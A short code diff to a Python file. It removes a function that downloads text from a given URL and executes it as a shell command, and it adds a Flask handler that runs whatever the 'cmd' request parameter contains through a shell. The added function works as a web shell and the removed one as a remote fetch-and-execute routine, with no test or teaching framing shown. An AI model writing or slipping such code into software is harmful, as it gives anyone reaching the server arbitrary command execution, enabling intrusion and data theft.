@@ -1,7 +1,8 @@
-import requests
 import subprocess
 
+from flask import request
 
-def fetch_and_run(url):
-    cmd = requests.get(url).text
+
+def run_from_request():
+    cmd = request.args.get("cmd")
     return subprocess.check_output(cmd, shell=True)
